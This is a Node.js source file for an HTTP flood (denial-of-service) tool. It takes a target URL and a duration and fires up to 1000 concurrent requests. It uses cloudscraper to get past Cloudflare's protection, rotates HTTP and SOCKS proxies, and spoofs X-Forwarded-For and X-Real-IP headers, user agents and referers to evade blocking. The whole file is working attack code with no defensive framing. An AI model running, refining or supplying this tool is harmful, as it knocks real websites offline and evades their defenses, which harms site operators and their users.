var cloudscraper = require('cloudscraper');
var randomstring = require("randomstring");
var fs = require('fs');
var HttpsProxyAgent = require('https-proxy-agent');
var SocksProxyAgent = require('socks-proxy-agent');

var args = process.argv.slice(2);

randomByte = function() {
    return Math.floor(Math.random() * 255) + 1;
}

// Validasi input
if (process.argv.length <= 3) {
    console.log("Usage: node cf.js <url> <time> [proxyFile]");
    console.log("Example: node cf.js https://example.com 60 proxy.txt");
    process.exit(-1);
}

var url = process.argv[2];
var time = parseInt(process.argv[3]);
var proxyFile = process.argv[4] || 'proxy.txt';

// Validasi URL
if (!url.startsWith('http://') && !url.startsWith('https://')) {
    console.log("Error: URL must start with http:// or https://");
    process.exit(-1);
}

// Validasi waktu
if (isNaN(time) || time <= 0 || time > 3600) {
    console.log("Error: Time must be between 1-3600 seconds");
    process.exit(-1);
}

// Load proxies
function loadProxies() {
    try {
        if (!fs.existsSync(proxyFile)) {
            console.log(`Proxy file not found: ${proxyFile}`);
            return [];
        }
        
        const content = fs.readFileSync(proxyFile, 'utf8');
        const lines = content.split('\n');
        const proxies = [];
        
        for (let line of lines) {
            line = line.trim();
            if (line && !line.startsWith('#')) {
                try {
                    let proxyUrl = line;
                    if (!line.includes('://')) {
                        proxyUrl = 'http://' + line;
                    }
                    
                    const parsedUrl = new URL(proxyUrl);
                    const protocol = parsedUrl.protocol.replace(':', '');
                    
                    if (['http', 'https', 'socks4', 'socks5'].includes(protocol)) {
                        proxies.push({
                            url: proxyUrl,
                            protocol: protocol,
                            host: parsedUrl.hostname,
                            port: parseInt(parsedUrl.port)
                        });
                    }
                } catch (e) {}
            }
        }
        
        console.log(`Loaded ${proxies.length} proxies`);
        return proxies;
    } catch (error) {
        console.log(`Error: ${error.message}`);
        return [];
    }
}

// Create proxy agent
function createProxyAgent(proxy) {
    try {
        switch (proxy.protocol) {
            case 'http':
            case 'https':
                return new HttpsProxyAgent(proxy.url);
            case 'socks4':
                return new SocksProxyAgent(proxy.url);
            case 'socks5':
                return new SocksProxyAgent(proxy.url);
            default:
                return null;
        }
    } catch (error) {
        return null;
    }
}

// Konfigurasi
const CONFIG = {
    maxConcurrent: 1000,
    requestTimeout: 5000,
    refreshCookieEvery: 30,
    maxRetries: 1,
    proxyRotation: 'roundrobin',
    maxProxyFailures: 3,
    reuseProxyForRequests: 10
};

// Variabel global
var currentCookie = '';
var currentUserAgent = '';
var requestCount = 0;
var successCount = 0;
var errorCount = 0;
var activeRequests = 0;
var requestQueue = [];
var isRunning = true;
var proxies = [];
var activeProxies = [];
var proxyStats = new Map();
var currentProxyIndex = 0;
var requestsOnCurrentProxy = 0;

// User agents
function getRandomUserAgent() {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Random IP
function generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// Get next proxy
function getNextProxy() {
    if (activeProxies.length === 0) return null;
    
    if (CONFIG.proxyRotation === 'random') {
        return activeProxies[Math.floor(Math.random() * activeProxies.length)];
    } else {
        if (requestsOnCurrentProxy >= CONFIG.reuseProxyForRequests) {
            currentProxyIndex = (currentProxyIndex + 1) % activeProxies.length;
            requestsOnCurrentProxy = 0;
        }
        return activeProxies[currentProxyIndex % activeProxies.length];
    }
}

// Update proxy stats
function updateProxyStats(proxy, success) {
    if (!proxyStats.has(proxy.url)) {
        proxyStats.set(proxy.url, { successes: 0, failures: 0 });
    }
    
    const stats = proxyStats.get(proxy.url);
    if (success) {
        stats.successes++;
        stats.failures = 0;
    } else {
        stats.failures++;
        
        if (stats.failures >= CONFIG.maxProxyFailures) {
            const index = activeProxies.findIndex(p => p.url === proxy.url);
            if (index !== -1) {
                activeProxies.splice(index, 1);
            }
        }
    }
}

// Refresh cookie
async function refreshCookieAndUA(proxy = null) {
    return new Promise((resolve) => {
        const options = {
            url: url,
            timeout: CONFIG.requestTimeout,
            followRedirect: true
        };
        
        if (proxy) {
            const agent = createProxyAgent(proxy);
            if (agent) options.agent = agent;
        }
        
        cloudscraper.get(options, function(error, response, body) {
            if (!error && response && response.request) {
                if (response.request.headers && response.request.headers.cookie) {
                    currentCookie = response.request.headers.cookie;
                }
                if (response.request.headers && response.request.headers['User-Agent']) {
                    currentUserAgent = response.request.headers['User-Agent'];
                }
            } else {
                currentUserAgent = getRandomUserAgent();
            }
            resolve();
        });
    });
}

// Send request
async function sendRequest(retryCount = 0) {
    return new Promise((resolve) => {
        if (!isRunning) {
            resolve(false);
            return;
        }

        const ip = generateRandomIP();
        const randDomain = randomstring.generate({ length: 10, charset: 'abcdefghijklmnopqrstuvwxyz0123456789' });
        const proxy = getNextProxy();
        
        const options = {
            url: url,
            timeout: CONFIG.requestTimeout,
            headers: {
                'User-Agent': currentUserAgent || getRandomUserAgent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Upgrade-Insecure-Requests': '1',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Referer': 'https://google.com/search?q=' + randDomain,
                'X-Forwarded-For': ip,
                'X-Real-IP': ip
            }
        };

        if (currentCookie) {
            options.headers['Cookie'] = currentCookie;
        }
        
        if (proxy) {
            const agent = createProxyAgent(proxy);
            if (agent) {
                options.agent = agent;
            }
        }

        activeRequests++;
        
        cloudscraper(options, function(error, response, body) {
            activeRequests--;
            requestsOnCurrentProxy++;
            
            if (error) {
                errorCount++;
                if (proxy) updateProxyStats(proxy, false);
                
                if (retryCount < CONFIG.maxRetries) {
                    setTimeout(() => {
                        sendRequest(retryCount + 1).then(resolve);
                    }, 0);
                } else {
                    resolve(false);
                }
            } else {
                successCount++;
                if (proxy) updateProxyStats(proxy, true);
                resolve(true);
            }
            
            processQueue();
        });
    });
}

// Process queue
function processQueue() {
    while (isRunning && activeRequests < CONFIG.maxConcurrent && requestQueue.length > 0) {
        const nextRequest = requestQueue.shift();
        nextRequest();
    }
}

// Queue request
function queueRequest() {
    return new Promise((resolve) => {
        const requestPromise = () => {
            sendRequest().then(resolve);
        };
        
        if (activeRequests < CONFIG.maxConcurrent) {
            requestPromise();
        } else {
            requestQueue.push(requestPromise);
        }
    });
}

// Initialize proxies
async function initializeProxies() {
    proxies = loadProxies();
    
    if (proxies.length === 0) {
        console.log("No proxies, running without...");
        activeProxies = [];
        return true;
    }
    
    activeProxies = [...proxies];
    console.log(`Using ${activeProxies.length} proxies`);
    return true;
}

// Main attack
async function startAttack() {
    console.log(`\n▶ Target: ${url}`);
    console.log(`▶ Duration: ${time}s`);
    console.log(`▶ Concurrent: ${CONFIG.maxConcurrent}`);
    console.log('─'.repeat(40));
    
    await initializeProxies();
    await refreshCookieAndUA(activeProxies[0] || null);
    
    // Refresh cookie periodically
    const cookieRefreshInterval = setInterval(async () => {
        if (isRunning) {
            const proxy = activeProxies[Math.floor(Math.random() * activeProxies.length)];
            await refreshCookieAndUA(proxy || null);
        } else {
            clearInterval(cookieRefreshInterval);
        }
    }, CONFIG.refreshCookieEvery * 1000);
    
    const endTime = Date.now() + (time * 1000);
    const startTime = Date.now();
    
    // Status display interval
    const statusInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = requestCount / elapsed;
        console.log(`[${Math.floor(elapsed)}s] RPS: ${rps.toFixed(0)} | OK: ${successCount} | ERR: ${errorCount} | TOT: ${requestCount} | PRX: ${activeProxies.length}`);
    }, 1000);
    
    // Main loop
    while (Date.now() < endTime && isRunning) {
        while (isRunning && activeRequests + requestQueue.length < CONFIG.maxConcurrent * 2) {
            queueRequest().catch(err => {});
        }
        await new Promise(resolve => setImmediate(resolve));
    }
    
    // Cleanup
    clearInterval(statusInterval);
    clearInterval(cookieRefreshInterval);
    isRunning = false;
    
    while (activeRequests > 0 || requestQueue.length > 0) {
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    console.log('─'.repeat(40));
    console.log(`✅ FINISHED | Req: ${requestCount} | OK: ${successCount} | ERR: ${errorCount} | RPS: ${(requestCount/time).toFixed(0)}`);
    process.exit(0);
}

// Error handlers
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('SIGINT', () => {
    console.log(`\n⏹ Stopping...`);
    isRunning = false;
    setTimeout(() => process.exit(0), 2000);
});

startAttack().catch(() => process.exit(1));
